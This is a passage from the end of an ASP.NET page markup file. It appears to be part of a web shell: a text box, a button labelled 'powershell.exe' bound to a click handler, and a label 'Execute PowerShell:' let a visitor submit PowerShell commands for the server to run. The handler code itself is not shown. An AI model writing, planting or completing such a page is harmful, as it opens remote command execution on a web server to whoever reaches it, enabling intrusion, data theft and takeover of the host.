...
<asp:TextBox id="txtArg_pwsh" style="Z-INDEX: 104; LEFT: 405px; POSITION: absolute; TOP: 40px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing_pwsh" style="Z-INDEX: 105; LEFT: 675px; POSITION: absolute; TOP: 36px" runat="server" Text="powershell.exe" OnClick="pwshExe_Click"></asp:Button>
<asp:Label id="lblText_pwsh" style="Z-INDEX: 106; LEFT: 310px; POSITION: absolute; TOP: 44px" runat="server">Execute PowerShell:</asp:Label>
</form>
</body>
</HTML>
